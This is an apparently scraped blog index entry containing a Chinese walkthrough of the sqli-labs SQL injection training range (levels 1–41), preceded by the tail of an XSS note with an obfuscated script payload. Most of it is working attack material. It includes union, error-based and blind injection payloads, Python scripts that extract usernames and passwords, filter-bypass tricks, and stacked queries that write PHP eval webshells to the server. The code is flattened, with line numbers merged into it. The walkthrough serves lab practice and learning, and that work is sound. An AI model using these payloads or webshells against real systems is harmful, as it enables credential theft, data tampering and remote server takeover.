12&quot;&gt;&lt;script&gt;eval(atob(&quot;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;));&lt;/script&gt;&quot;&gt;&lt;script&gt;alert","categories":[{"name":"web漏洞笔记","slug":"web漏洞笔记","permalink":"http://m0th.top/categories/web%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://m0th.top/tags/XSS/"}]},{"title":"sql-libs通关笔记","slug":"sql-libs通关笔记","date":"2021-01-15T04:07:25.000Z","updated":"2021-03-26T09:46:37.374Z","comments":true,"path":"2021/01/15/sql-libs通关笔记/","link":"","permalink":"http://m0th.top/2021/01/15/sql-libs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/","excerpt":"从去年入门时就玩过一段时间的sqli-labs，打通过10多关就没有坚持下来，后面的ctf做题中，其实发现自己对sql注入的掌握并不是尽如人意，重回靶场。未完待续！","text":"从去年入门时就玩过一段时间的sqli-labs，打通过10多关就没有坚持下来，后面的ctf做题中，其实发现自己对sql注入的掌握并不是尽如人意，重回靶场。未完待续！ Less-112http://sqli/Less-1/?id=-1&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;-- +http://sqli/Less-1/?id=-1&#x27; union select 1,group_concat(CONCAT(username,0x7e,password)),3 FROM users -- + Less-212http://sqli/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot;-- ahttp://sqli/Less-2/?id=-1 union select 1,group_concat(concat(username,&#x27;~&#x27;,password)),3 from users-- a Less-312http://sqli/Less-3/?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;-- a&#x27;) LIMIT 0,1http://sqli/Less-3/?id=-1&#x27;) union select 1,2,group_concat(concat(username,&#x27;~&#x27;,password)) from users-- a Less-4123http://sqli/Less-4/?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot;-- ahttp://sqli/Less-4/?id=-1&quot;) union select 1,group_concat(concat(username,&#x27;~&#x27;,password)),3 from users-- a Less-5123456http://sqli/Less-5/?id=1&#x27; || updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) and 1=&#x27;1http://sqli/Less-5/?id=1&#x27; || updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),0x7e),1) or &#x27;1&#x27;=&#x27;1#为了把数据截断的更全一些http://sqli/Less-5/?id=1&#x27;|| updatexml(1,concat(0x7e,substr((select group_concat(column_name) From information_schema.columns where table_name=&#x27;users&#x27;),1,32),0x7e),1) or &#x27;1&#x27;=&#x27;1http://sqli/Less-5/?id=1&#x27;|| updatexml(1,concat(0x7e,substr((select group_concat(concat(username,0x7e,password)) From users),1,32),0x7e),1) or &#x27;1&#x27;=&#x27;1 Less-612http://sqli/Less-5/?id=1&quot;|| updatexml(1,concat(0x7e,substr((select group_concat(column_name) From information_schema.columns where table_name=&#x27;users&#x27;),1,32),0x7e),1) or &#x27;1&#x27;=&quot;1http://sqli/Less-6/?id=1&quot; || updatexml(1,concat(0x7e,substr((select group_concat(concat(username,0x7e,password)) From users),1,32),0x7e),1) or &#x27;1&#x27;=&quot;1 Less-7outfile写入webshell1http://sqli/Less-7/?id=1&#x27;)) union select 1,&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;,3 into outfile &quot;D:\\\\phpstudy_pro\\\\WWW\\\\sqli\\\\less-7\\\\webshell1.php&quot; -- a Less-8最简单的bool盲注1234567891011121314151617181920212223import requests as reqdef booler_injection(url): str_head=&#x27;the_data_is:...&#x27; py_dict=&#123; &#x27;str1&#x27;:&#x27;?id=1\\&#x27; and ord(substr((select database()),&#123;0&#125;,1))=&#123;1&#125; -- +&#x27;, &#x27;str2&#x27;:&#x27;?id=1\\&#x27; and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\\&#x27;security\\&#x27;),&#123;0&#125;,1))=&#123;1&#125; -- +&#x27;, &#x27;str3&#x27;:&#x27;?id=1\\&#x27; and ord(substr((select group_concat(concat(username,0x7e,password)) from users),&#123;0&#125;,1))=&#123;1&#125; -- +&#x27; &#125; for i in range(1,30): for j in range(32,129): payload_str=py_dict[&#x27;str3&#x27;].format(i,j) pld=url+payload_str req1=req.get(pld) if &quot;You are in...........&quot; in req1.text: str_head=str_head+chr(j) print(str_head)if __name__==&quot;__main__&quot;: url=&quot;http://sqli/Less-8/&quot; booler_injection(url) Less-9最简单的time盲注123456789101112131415161718192021222324252627import requests as reqimport stringimport randomimport timedef time_injection(url): str_head=&quot;the_data_is:...&quot; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;&#125; py_dict=&#123; &#x27;str1&#x27;: &#x27;?id=1\\&#x27; and if(ord(substr((select database()),&#123;0&#125;,1))=&#123;1&#125;,sleep(4),1) -- +&#x27;, &#x27;str2&#x27;: &#x27;?id=1\\&#x27; and if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\\&#x27;security\\&#x27;),&#123;0&#125;,1))=&#123;1&#125;,sleep(4),1) -- +&#x27;, &#x27;str3&#x27;: &#x27;?id=1\\&#x27; and if(ord(substr((select group_concat(concat(username,0x7e,password)) from users),&#123;0&#125;,1))=&#123;1&#125;,sleep(4),1) -- +&#x27; &#125; for i in range(1,30): for j in range(32,128): start_time=time.time() payload_str=url+py_dict[&#x27;str1&#x27;].format(i,j) req1=req.get(url=payload_str,headers=headers) next_time=time.time() if(next_time-start_time&gt;3): str_head=str_head+chr(j) print(str_head) breakif __name__==&quot;__main__&quot;: url=&quot;http://sqli/Less-9/&quot; #booler_injection(url) time_injection(url) 我发现这个程序速度太慢了，于是加了一个二分搜索的优化，然而本人发现并没有提速反而变慢了，就很难受！ 而且本人对算法没有研究过，代码真是难看，后面会学一下搜索的算法，然后再次优化 二分搜索123456789101112131415161718192021222324252627282930313233343536import requests as reqimport stringimport randomimport timedef time_injection_add(url): str_head = &quot;the_data_is:...&quot; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;&#125; py_dict = &#123; &#x27;str1&#x27;: &#x27;?id=1\\&#x27; and if(ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;, &#x27;str2&#x27;: &#x27;?id=1\\&#x27; and if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\\&#x27;security\\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;, &#x27;str3&#x27;: &#x27;?id=1\\&#x27; and if(ord(substr((select group_concat(concat(username,0x7e,password)) from users),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27; &#125; for i in range(1,30): the_max=127;the_min=32 while the_min&lt;the_max: mid=(the_max+the_min)&gt;&gt;1 payload_str=url+py_dict[&#x27;str1&#x27;].format(i,mid) start_time=time.time() req1=req.get(payload_str,headers) next_time=time.time() if next_time-start_time&gt;3: the_min=mid if the_max-the_min==1: #因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差1的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码 mid=the_min+1 break else: the_max=mid str_head=str_head+chr(mid) print(str_head)if __name__==&quot;__main__&quot;: url=&quot;http://sqli/Less-9/&quot; #booler_injection(url) #time_injection(url) time_injection_add(url) Less-10123456789101112131415161718192021222324252627282930313233343536import requests as reqimport stringimport randomimport timedef time_injection_add(url): str_head = &quot;the_data_is:...&quot; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;&#125; py_dict = &#123; &#x27;str1&#x27;: &#x27;?id=1\\&quot; and if(ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;, &#x27;str2&#x27;: &#x27;?id=1\\&quot; and if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\\&#x27;security\\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27;, &#x27;str3&#x27;: &#x27;?id=1\\&quot; and if(ord(substr((select group_concat(concat(username,0x7e,password)) from users),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(4),1) -- +&#x27; &#125; for i in range(1,30): the_max=127;the_min=32 while the_min&lt;the_max: mid=(the_max+the_min)&gt;&gt;1 payload_str=url+py_dict[&#x27;str1&#x27;].format(i,mid) start_time=time.time() req1=req.get(payload_str,headers) next_time=time.time() if next_time-start_time&gt;3: the_min=mid if the_max-the_min==1: #因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差1的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码 mid=the_min+1 break else: the_max=mid str_head=str_head+chr(mid) print(str_head)if __name__==&quot;__main__&quot;: url=&quot;http://sqli/Less-10/&quot; #booler_injection(url) #time_injection(url) time_injection_add(url) 本人简单学习了一下二分查找的算法，优化了一下代码 1 Less-111234567username=&#x27; union select 1,2 #username=&#x27; union select 1,database()#username=&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;#username=&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#username=&#x27; union select 1,group_concat(concat(username,0x7e,password)) fromusers#password=123 Less-12123456username=adn&quot;) union select 1,2#username=adn&quot;) union select 1,database()#username=adn&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;#username=adn&quot;) union select 1,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;#username=adm&quot;) union select 1,group_concat(concat(username,0x7e,password)) from users#password=123 Less-13123username=admin&#x27;) || updatexml(1,concat(0x7e,database(),0x7e),1)-- +username=admin&#x27;) || updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1)-- +username=admin&#x27;) || updatexml(1,substr(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1,32),1)-- + Less-14二分搜索bool盲注加上了二分搜索的bool盲注，速度相当可以 1234567891011121314151617181920212223242526272829303132333435import requests as reqimport timedef bool_injection(url,payld_dict): the_data=&#x27;the_date:...&#x27; headers=&#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27; &#125; for i in range(1,30): the_min=32;the_max=127 while the_min&lt;the_max: mid=(the_max+the_min)&gt;&gt;1 post_data = &#123; &#x27;uname&#x27;: payld_dict[&#x27;pyld3&#x27;].format(i,mid), &#x27;passwd&#x27;: &#x27;123&#x27; &#125; req1=req.post(url,post_data,headers) if &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27; in req1.text: the_min=mid if the_max - the_min == 1: # 因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差1的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码 mid = the_min + 1 break else: the_max=mid the_data=the_data+chr(mid) print(the_data)if __name__==&quot;__main__&quot;: url=&quot;http://sqli/Less-14/&quot; payld_dict=&#123; &#x27;pyld1&#x27;:&#x27;admin\\&quot; and ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125; -- + &#x27;, &#x27;pyld2&#x27;:&#x27;admin\\&quot; and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\\&#x27;security\\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;, &#x27;pyld3&#x27;:&#x27;admin\\&quot; and ord(substr((select group_concat(column_name) from information_schema.columns where table_name=\\&#x27;users\\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27; &#125; bool_injection(url,payld_dict) Less-151234567891011121314151617181920212223242526272829303132333435import requests as reqimport timedef bool_injection(url,payld_dict): the_data=&#x27;the_date:...&#x27; headers=&#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27; &#125; for i in range(1,30): the_min=32;the_max=127 while the_min&lt;the_max: mid=(the_max+the_min)&gt;&gt;1 post_data = &#123; &#x27;uname&#x27;: payld_dict[&#x27;pyld1&#x27;].format(i,mid), &#x27;passwd&#x27;: &#x27;123&#x27; &#125; req1=req.post(url,post_data,headers) if &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27; in req1.text: the_min=mid if the_max - the_min == 1: # 因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差1的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码 mid = the_min + 1 break else: the_max=mid the_data=the_data+chr(mid) print(the_data)if __name__==&quot;__main__&quot;: url=&quot;http://sqli/Less-15/&quot; payld_dict=&#123; &#x27;pyld1&#x27;:&#x27;admin\\&#x27; and ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125; -- + &#x27;, &#x27;pyld2&#x27;:&#x27;admin\\&#x27; and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\\&#x27;security\\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;, &#x27;pyld3&#x27;:&#x27;admin\\&#x27; and ord(substr((select group_concat(column_name) from information_schema.columns where table_name=\\&#x27;users\\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27; &#125; bool_injection(url,payld_dict) Less-161234567891011121314151617181920212223242526272829303132333435import requests as reqimport timedef bool_injection(url,payld_dict): the_data=&#x27;the_date:...&#x27; headers=&#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27; &#125; for i in range(1,30): the_min=32;the_max=127 while the_min&lt;the_max: mid=(the_max+the_min)&gt;&gt;1 post_data = &#123; &#x27;uname&#x27;: payld_dict[&#x27;pyld1&#x27;].format(i,mid), &#x27;passwd&#x27;: &#x27;123&#x27; &#125; req1=req.post(url,post_data,headers) if &#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27; in req1.text: the_min=mid if the_max - the_min == 1: # 因为我写的这种算法的缺陷导致如果真实值一开始就比中间值大的话，会卡在两者相差1的点，死循环,因为本人没学过算法，所以不知道如何更好的解决这个问题，只能加上这段奇怪的代码 mid = the_min + 1 break else: the_max=mid the_data=the_data+chr(mid) print(the_data)if __name__==&quot;__main__&quot;: url=&quot;http://sqli/Less-16/&quot; payld_dict=&#123; &#x27;pyld1&#x27;:&#x27;admin\\&quot;) and ord(substr((select database()),&#123;0&#125;,1))&gt;&#123;1&#125; -- + &#x27;, &#x27;pyld2&#x27;:&#x27;admin\\&quot;) and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=\\&#x27;security\\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27;, &#x27;pyld3&#x27;:&#x27;admin\\&quot;) and ord(substr((select group_concat(column_name) from information_schema.columns where table_name=\\&#x27;users\\&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;-- +&#x27; &#125; bool_injection(url,payld_dict) Less-17update注入最后查询数据时用到了派生表的语法 12345username=adminnew password =&#x27; || updatexml(1,concat(0x7e,(select database()),0x7e),1)-- +new password =&#x27; || updatexml(1,left(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),32),1)-- +new password =&#x27; || updatexml(1,left(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),32),1)-- +new password=&#x27; || updatexml(1,left(concat(0x7e,(select * from (select group_concat(concat(username,0x7e,password)) from security.users)a),0x7e),32),1)-- + Less-18head头注入 12User-Agent: &#x27; and updatexml(1,left(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),32),1) or &#x27;1&#x27;=&#x27;1User-Agent: &#x27; and updatexml(1,left(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),32),1) or &#x27;1&#x27;=&#x27;1 Less-1912Referer: &#x27; and updatexml(1,left(concat(0x7e,(select database()),0x7e),32),1) or &#x27;1&#x27;=&#x27;1Referer: 123&#x27; and updatexml(1,left(concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),32),1) or &#x27;1&#x27;=&#x27;1 Less-20cookie注入1234567891011121314151617POST /Less-20/ HTTP/1.1Host: sqliUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 24Origin: http://sqliCookie: uname=dmin&#x27; union select 1,database(),3#Connection: closeReferer: http://sqli/Less-20/Upgrade-Insecure-Requests: 1Cookie: uname=dmin&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;#Cookie: uname=dmin&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;#Cookie: uname=dmin&#x27; union select 1,group_concat(concat(username,0x7e,password)),3 from users# Less-21cookie +base64编码123456789101112131415POST /Less-21/ HTTP/1.1Host: sqliUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 24Origin: http://sqliCookie: uname=YWRtbicpIHVuaW9uIHNlbGVjdCAxLGRhdGFiYXNlKCksMyM=Connection: closeReferer: http://sqli/Less-21/Upgrade-Insecure-Requests: 1Cookie: uname=YWRtbicpIHVuaW9uIHNlbGVjdCAxLGRhdGFiYXNlKCksMyM= #admn&#x27;) union select 1,database(),3# Less-2212345678910111213141516POST /Less-22/ HTTP/1.1Host: sqliUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 24Origin: http://sqliCookie: uname=YWRtbiIgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSwzIw==Connection: closeReferer: http://sqli/Less-22/Upgrade-Insecure-Requests: 1Cookie: uname=YWRtbiIgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSwzIw==admn&quot; union select 1,database(),3# 的base64编码 Less-23123http://sqli/Less-23/?id=-1&#x27; union select 1,2,&#x27;3http://sqli/Less-23/?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#x27;3http://sqli/Less-23/?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#x27;3 Less-24简单的二次注入环境了一点问题，后面用dockerfile写一个搭建环境，从新打一下试试,布谷布谷 1 Less-25双写绕过过滤了 and or ,好像并不是很需要呀 information_schema库中 or 可以双写绕过 1234http://sqli/Less-25/?id=-1&#x27; union select 1,database(),3-- +http://sqli/Less-25/?id=-1&#x27; union select 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema=&#x27;security&#x27;-- + 双写绕过http://sqli/Less-25/?id=-1&#x27; union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name=&#x27;users&#x27;-- +http://sqli/Less-25/?id=-1&#x27; union select 1,group_concat(concat(username,0x7e,passwoorrd)),3 from users-- + #双写绕过 Less-26绕过空格两种绕过思路 第一种 采用逻辑运算符 第二种 采用一些特殊的url编码代替 1234567891011121314151617import requests as reqdef test_url(url): for i in range(256): tmp1=changeToHex(i) urlstring=url.format(tmp1) re=req.get(urlstring) if &#x27;Dumb&#x27; in re.text: print(&#x27;good!this can use&#x27;,tmp1)def changeToHex(num): tmp=hex(num).replace(&#x27;0x&#x27;,&#x27;&#x27;) if len(tmp)&lt;2: tmp=&#x27;0&#x27;+tmp return &#x27;%&#x27;+tmpif __name__==&quot;__main__&quot;: url=&quot;http://sqli/less-26/?id=0&#x27;&#123;0&#125;||&#123;0&#125;&#x27;1&#x27;=&#x27;1&quot; test_url(url) tips: 感觉作用并不是很明显，在这里仅仅相当与测出了可以代替字符和被过滤字符的集合，因为||左右加不加空格都可以 查看源码知道 %a0 都是被过滤字符 123http://sqli/Less-26/?id=0&#x27;%a0union%a0select%a01,database(),2%a0||%a0&#x27;1&#x27;=&#x27;1http://sqli/Less-26/?id=0&#x27;%a0union%a0select%a01,2,group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_name=&#x27;users&#x27;%a0||%a0&#x27;1&#x27;=&#x27;13http://sqli/Less-26/?id=0&#x27;%a0union%a0select%a01,2,group_concat(concat(username,0x7e,passwoorrd))%a0from%a0security.users%a0where%0a&#x27;1&#x27;=&#x27;1 当然远不这一种注入方式 updatexml报错注入 以及 bool盲注都可以 Less-27大小写绕过在26题的基础上进行了一点改进，仅仅是一个大小写绕过union select 的点 ，而且 and or被允许使用了 123http://sqli/Less-27/?id=0&#x27;%a0uNion%a0seLect%a01,database(),2%a0||%a0&#x27;1&#x27;=&#x27;1http://sqli/Less-27/?id=0&#x27;%a0uNion%a0seLect%a01,2,group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name=&#x27;users&#x27;%a0||%a0&#x27;1&#x27;=&#x27;13http://sqli/Less-27/?id=0&#x27;%a0uNion%a0sElect%a01,2,group_concat(concat(username,0x7e,password))%a0from%a0security.users%a0where%0a&#x27;1&#x27;=&#x27;1 Less-28union select被彻底过滤（双写，大小写都绕不过）12http://sqli/Less-28/?id=0%27)%A0uNion%A0seLect%A01,2,3||(%271%27)=(%271 http://sqli/Less-28/?id=0%27)%A0uNion%A0seLect%A01,group_concat(table_name),3%A0from%A0information_schema.tables%A0where%A0table_schema=%27security%27||(%271%27)=(%2712http://sqli/Less-28/?id=0%27)%A0uNion%A0seLect%A01,group_concat(concat(username,0x7e,password)),3%A0from%A0security.users%A0where%A0(%271%27)=(%271 Less-29HPP（http参数污染绕过）因为我本地没有装tomcat环境，所以简单写一下过程，后面会在服务器上搭建一个完全版本的sql-libs HPP 是一种简单的绕过方式，利用的不同的服务器对http参数的处理方式存在差异从而绕过一些限制 假如我传入 了 ?id=1&amp;&amp;id=2 相同参数名不同值 对于apache来说，处理后面 id=2 对于tomcat来说，处理前面 id=1 所以绕过方式很简单 1234sqli/Less-29/login.php?id=2&amp;&amp;id=-1&#x27; union select 1,2,&#x27;3sqli/Less-29/login.php?id=2&amp;&amp;id=-1&#x27; union select 1,database(),&#x27;3sqli/Less-29/login.php?id=2&amp;&amp;id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; and &#x27;1&#x27;=&#x27;1 sqli/Less-29/login.php?id=2&amp;&amp;id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and &#x27;1&#x27;=&#x27;1 Less-30跟29关差不多，只是闭合方式的变化 1234sqli/Less-30/login.php?id=2&amp;&amp;id=-1&quot; union select 1,2,&quot;3sqli/Less-30/login.php?id=2&amp;&amp;id=-1&quot; union select 1,database(),&quot;3sqli/Less-30/login.php?id=2&amp;&amp;id=-1&quot; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; and &quot;1&quot;=&quot;1 sqli/Less-30/login.php?id=2&amp;&amp;id=-1&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and &quot;1&quot;=&quot;1 Less-31跟29关差不多，只是闭合方式的变化 1234sqli/Less-31/login.php?id=2&amp;&amp;id=-1&quot;) union select 1,2,&quot;3sqli/Less-31/login.php?id=2&amp;&amp;id=-1&quot;) union select 1,database(),&quot;3sqli/Less-31/login.php?id=2&amp;&amp;id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; and (&quot;1&quot;)=(&quot;1 sqli/Less-31/login.php?id=2&amp;&amp;id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and (&quot;1&quot;)=(&quot;1 Less-32宽字节注入123http://sqli/Less-32/?id=-1%df&#x27; union select 1,2,3--+http://sqli/less-32/?id=-1%df&#x27; union select 1,database(),3--+http://sqli/less-32/?id=-1%df&#x27; union select 1,group_concat(concat(username,0x7e,password)),3 from users--+ Less-33宽字节注入，这次使用了addslashes()函数 123http://sqli/Less-33/?id=-1%df&#x27; union select 1,2,3--+http://sqli/less-33/?id=-1%df&#x27; union select 1,database(),3--+http://sqli/less-33/?id=-1%df&#x27; union select 1,group_concat(concat(username,0x7e,password)),3 from users--+ 如何安全使用addslashes()函数 使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，可以防止宽字节注入漏洞 Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn); Less-34编码转换注入本题其实仍然可以采用宽字节注入的方法来解题 但是sql注入天书给了一种跟好的思路，即将utf-8转为utf-16或者utf-32 同时linux系统本身提供了一个好用的编码转换命令 12echo \\&#x27;|iconv -f utf-8 -t utf-16 #��&#x27;echo \\&#x27;|iconv -f utf-8 -t utf-32 #��&#x27; 1234uname=�&#x27; or 1#&amp;passwd=123uname=�&#x27; or extractvalue(1,concat(0x7e,database(),0x7e))#&amp;passwd=123uname=�&#x27; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),0x7e))#&amp;passwd=123uname=�&#x27; or extractvalue(1,substr(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),0x7e),1,32))#&amp;passwd=123 Less-3512http://sqli/Less-35/?id=-1%20union%20select%201,2,database()--+http://sqli/Less-35/?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x7365637572697479--+ Less-3612http://sqli/Less-35/?id=-1$df%27%20union%20select%201,2,database()--+http://sqli/Less-36/?id=-1%df%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x7365637572697479--+ 在使用 mysql_real_escape_string()时，如何能够安全的防护这种问题，需要将 mysql 设置为 gbk 即可。 设置代码： Mysql_set_charset(‘gbk’,’$conn’) Less-371234uname=�&#x27; or 1#&amp;passwd=123uname=�&#x27; or extractvalue(1,concat(0x7e,database(),0x7e))#&amp;passwd=123uname=�&#x27; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),0x7e))#&amp;passwd=123uname=�&#x27; or extractvalue(1,substr(concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),0x7e),1,32))#&amp;passwd=123 Less-38堆叠注入123http://sqli/Less-38/?id=0%27;insert%20into%20users(id,username,password)%20values%20(%2739%27,%27M0th%27,%27M0th%27)--%20a 能加行http://sqli/Less-38/?id=0%27;select%201,%22%3C?php%20%20@eval($_POST[%27cmd%27]);?%3E%22,3%20into%20outfile%20%22D:\\\\phpstudy_pro\\\\WWW\\\\sqli\\\\less-38\\\\webshell1.php%22%20--%20a 能写webshell#测试读文件未成功 Less-39123http://sqli/Less-39/?id=-1%20union%20select%201,2,3--%20a #正常注入可以拿数据http://sqli/Less-39/?id=0;insert%20into%20users(id,username,password)%20values%20(%2739%27,%27M0th%27,%27M0th%27)--%20a #能加行http://sqli/Less-39/?id=0;select%201,%22%3C?php%20%20@eval($_POST[%27cmd%27]);?%3E%22,3%20into%20outfile%20%22D:\\\\phpstudy_pro\\\\WWW\\\\sqli\\\\less-39\\\\webshell1.php%22%20--%20a #能写webshell less-40123http://sqli/Less-40/?id=-1%27)%20union%20select%201,2,3--%20a #正常注入可以拿数据http://sqli/Less-40/?id=-1&#x27;);insert into users(id,username,password) value (&#x27;40&#x27;,&#x27;M0th&#x27;,&#x27;M0th&#x27;); -- a #能添加数据http://sqli/Less-40/?id=0%27);select%201,%22%3C?php%20@eval(system($_POST[%27M0th%27]));?%3E%22,3%20into%20outfile%20%22D:\\\\phpstudy_pro\\\\WWW\\\\sqli\\\\less-40\\\\webshell.php%22%20--%20a #能写webshell less-411http://sqli/Less-40/?id=1&#x27;;insert into users(id,username,password) value (&#x27;41&#x27;,&#x27;M0th&#x27;,&#x27;M0th&#x27;); -- a less-401 less-401 less-401 less-401 